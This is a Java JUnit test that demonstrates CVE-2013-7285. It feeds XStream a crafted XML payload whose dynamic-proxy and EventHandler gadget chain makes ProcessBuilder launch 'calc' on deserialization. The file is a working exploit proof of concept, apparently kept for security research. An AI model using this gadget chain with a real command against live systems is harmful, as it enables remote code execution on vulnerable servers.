package com.github.enokiy;

import com.thoughtworks.xstream.XStream;
import org.junit.Test;

public class XstreamUnmashalDemo {

    @Test
    public void testCVE20137285(){
        String poc = "<sorted-set>\n" +
                "    <string>foo</string>\n" +
                "    <dynamic-proxy>" +
                "        <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>calc</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "            <action>start</action>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</sorted-set>";
        XStream xstream = new XStream();
        xstream.fromXML(poc);
    }
}
